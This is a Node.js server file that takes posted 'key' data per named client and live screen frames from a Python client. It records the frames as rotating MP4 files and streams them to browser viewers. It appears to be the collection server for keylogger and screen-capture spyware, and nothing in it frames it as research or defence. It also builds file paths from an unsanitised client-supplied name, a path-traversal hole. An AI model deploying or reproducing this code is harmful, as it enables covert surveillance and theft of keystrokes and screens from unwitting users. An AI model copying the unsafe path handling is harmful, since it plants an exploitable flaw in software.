import express from "express";
import cors from "cors";
import multer from "multer";
import { WebSocketServer, WebSocket } from "ws";

import path from "path";
import { fileURLToPath } from "url";

import fs from "fs";
import ffmpegPath from "ffmpeg-static";
import cookieParser from "cookie-parser";
import jwt from "jsonwebtoken";
import { spawn } from "child_process";
import { Rewrite } from "./rewriter.js";
// hh-gffs-45443-gjjhvn-534-dfbbd-21124-hjjh

const app = express();
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// const storage = multer.diskStorage({

//     destination: "uploads/",

//     filename: async(req, file, cb) => {

//         const ext = path.extname(file.originalname);
//         const name = path.basename(
//             file.originalname,
//             ext
//         );

//         let filename = file.originalname;
//         let counter = 2;

//         while (
//             fs.existsSync(
//                 path.join("uploads", filename)
//             )
//         ) {
//             filename = `${name}${counter}${ext}`;
//             counter++;
//         }

//         cb(null, filename);
//     }
// });
// const upload = multer({ storage });

// =====================================================
// FOLDERS
// =====================================================
const upload = multer({ dest: "./uploads" });

const videosFolder = path.join(__dirname, "videos");
const liveFolder = path.join(__dirname, "live");

if (!fs.existsSync(videosFolder)) {
  fs.mkdirSync(videosFolder, { recursive: true });
}
if (!fs.existsSync(liveFolder)) {
  fs.mkdirSync(liveFolder, { recursive: true });
}

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, "./public")));
app.use(cors());

app.post("/keys", async (req, res) => {
  console.log(req.body);
  await fs.promises.appendFile(
    `./uploads/${req.body.name}.txt`,
    JSON.stringify(req.body) + ",\n",
    "utf8",
  );
  await Rewrite(req.body.key, `./live/${req.body.name}.txt`);
  return res.status(200).json({
    message: "successfully sent",
  });
});

const server = app.listen(8000, "0.0.0.0", () => {
  console.log("HTTP server: http://192.168.1.139:8000");
});

const wss = new WebSocketServer({
  server,
});

const clients = new Map();
const viewers = new Set();

function createVideoRecorder(userId) {
  let recorder = null;
  let rotationTimer = null;
  let stopped = false;

  function startRecorder() {
    const filename = `screen-${userId}-${Date.now()}.mp4`;

    const outputPath = path.join(videosFolder, filename);

    console.log(`[${userId}] Starting recording:`, outputPath);

    const ffmpeg = spawn(ffmpegPath, [
      "-f",
      "image2pipe",

      "-framerate",
      "20",

      "-vcodec",
      "mjpeg",

      "-i",
      "-",

      "-c:v",
      "libx264",

      "-pix_fmt",
      "yuv420p",

      "-y",
      outputPath,
    ]);

    ffmpeg.stderr.on("data", (data) => {
      // console.log(data.toString());
    });

    ffmpeg.on("close", (code) => {
      console.log(`[${userId}] FFmpeg finished: ${code}`);
    });

    ffmpeg.on("error", (error) => {
      console.error(`[${userId}] FFmpeg error:`, error);
    });

    recorder = {
      ffmpeg,
      outputPath,
    };

    rotationTimer = setTimeout(
      () => {
        if (stopped) return;

        console.log(`[${userId}] 5 minutes reached`);

        if (recorder && !recorder.ffmpeg.stdin.destroyed) {
          recorder.ffmpeg.stdin.end();
        }

        startRecorder();
      },
      5 * 60 * 1000,
    );
  }

  startRecorder();

  return {
    writeFrame(data) {
      if (recorder && !recorder.ffmpeg.stdin.destroyed) {
        recorder.ffmpeg.stdin.write(data);
      }
    },

    stop() {
      stopped = true;

      if (rotationTimer) {
        clearTimeout(rotationTimer);
        rotationTimer = null;
      }

      if (recorder && !recorder.ffmpeg.stdin.destroyed) {
        recorder.ffmpeg.stdin.end();
      }
    },
  };
}

wss.on("connection", (socket, request) => {
  const url = new URL(request.url, "http://192.168.1.139:8000");

  const pathname = url.pathname;
  const userId = url.searchParams.get("id");

  console.log("WebSocket connection:", request.url);

  if (pathname === "/screen") {
    if (!userId) {
      console.log("Screen connection rejected: no ID");

      socket.close();

      return;
    }

    console.log(`[${userId}] Python connected`);

    if (clients.has(userId)) {
      console.log(`[${userId}] ID already connected`);
      socket.close();
      return;
    }

    const client = {
      socket,
      recorder: createVideoRecorder(userId),
    };
    clients.set(userId, client);

    for (const viewer of viewers) {
      if (viewer.readyState === WebSocket.OPEN) {
        viewer.send(
          JSON.stringify({
            type: "user-connected",
            userId,
          }),
        );
      }
    }

    let lastFrameTime = Date.now();

    socket.on("message", (data) => {
      const now = Date.now();
      const elapsed = (now - lastFrameTime) / 1000;
      lastFrameTime = now;

      console.log(`Frame interval: ${elapsed.toFixed(3)}s`);

      const currentClient = clients.get(userId);

      if (!currentClient) {
        return;
      }

      currentClient.recorder.writeFrame(data);

      const message = JSON.stringify({
        type: "frame",
        userId,
        data: data.toString("base64"),
      });

      for (const viewer of viewers) {
        if (viewer.readyState === WebSocket.OPEN) {
          viewer.send(message);
        }
      }
    });

    socket.on("close", () => {
      console.log(`[${userId}] Python disconnected`);
      const currentClient = clients.get(userId);
      if (!currentClient) {
        return;
      }

      currentClient.recorder.stop();
      clients.delete(userId);

      for (const viewer of viewers) {
        if (viewer.readyState === WebSocket.OPEN) {
          viewer.send(
            JSON.stringify({
              type: "user-disconnected",
              userId,
            }),
          );
        }
      }
    });

    socket.on("error", (error) => {
      console.error(`[${userId}] Python WebSocket error:`, error);
    });

    return;
  }

  if (pathname === "/viewer") {
    console.log("Browser viewer connected");
    viewers.add(socket);

    for (const [userId] of clients) {
      if (socket.readyState === WebSocket.OPEN) {
        socket.send(
          JSON.stringify({
            type: "user-connected",
            userId,
          }),
        );
      }
    }

    socket.on("close", () => {
      console.log("Browser viewer disconnected");
      viewers.delete(socket);
    });

    socket.on("error", (error) => {
      console.error("Browser WebSocket error:", error);
      viewers.delete(socket);
    });

    return;
  }

  console.log("Unknown WebSocket path:", pathname);
  socket.close();
});

// wss.on("connection", (socket, request) => {

//     const pathname = new URL(
//         request.url,
//         "http://192.168.1.45:8000"
//     ).pathname;

//     console.log(
//         "WebSocket connection:",
//         pathname
//     );

//     if (pathname === "/screen") {

//         console.log("Python connected");

//         pythonSocket = socket;

//         const recorder = createVideoRecorder();

//         socket.on("message", (data) => {

//             console.log(
//                 "Frame:",
//                 data.length,
//                 "bytes"
//             );

//             recorder.writeFrame(data);

//             for (const viewer of viewers) {

//                 if (
//                     viewer.readyState === WebSocket.OPEN
//                 ) {

//                     viewer.send(data);

//                 }

//             }

//         });

//         socket.on("close", () => {

//             console.log(
//                 "Python disconnected"
//             );

//             recorder.stop();

//             if (pythonSocket === socket) {

//                 pythonSocket = null;

//             }

//         });

//         socket.on("error", (error) => {

//             console.error(
//                 "Python WebSocket error:",
//                 error
//             );

//         });

//         return;
//     }

//     if (pathname === "/viewer") {
//         console.log(
//             "Browser connected"
//         );

//         viewers.add(socket);
//         console.log(
//             "Number of viewers:",
//             viewers.size
//         );

//         socket.on("close", () => {

//             console.log(
//                 "Browser disconnected"
//             );

//             viewers.delete(socket);

//         });

//         socket.on("error", (error) => {

//             console.error(
//                 "Browser WebSocket error:",
//                 error
//             );

//             viewers.delete(socket);

//         });

//         return;
//     }

//     console.log(
//         "Unknown WebSocket path:",
//         pathname
//     );

//     socket.close();

// });
